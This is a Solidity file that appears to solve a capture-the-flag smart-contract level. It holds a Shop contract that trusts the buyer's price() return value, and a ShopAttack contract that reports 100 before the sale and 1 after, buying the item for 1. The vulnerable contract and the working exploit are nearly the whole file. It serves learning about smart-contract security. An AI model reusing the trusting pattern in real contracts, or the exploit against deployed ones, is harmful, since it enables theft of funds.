// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract ShopAttack {

    Shop target;
    bool passCheck = false;
    
    constructor(address _instanceAddress) public  {
        target = Shop(_instanceAddress);
    }

    function price() external view returns (uint) {
        
        // if(passCheck){
        //     //passCheck = false;
        //     return 100;
        // } else {
        //     return 99;
        // }
        
        return (target.isSold()) ?  1 : 100;
    }

    function callBuy() public {
        //passCheck = (!passCheck);
        target.buy();
        //passCheck = (!passCheck);
        
    }
}
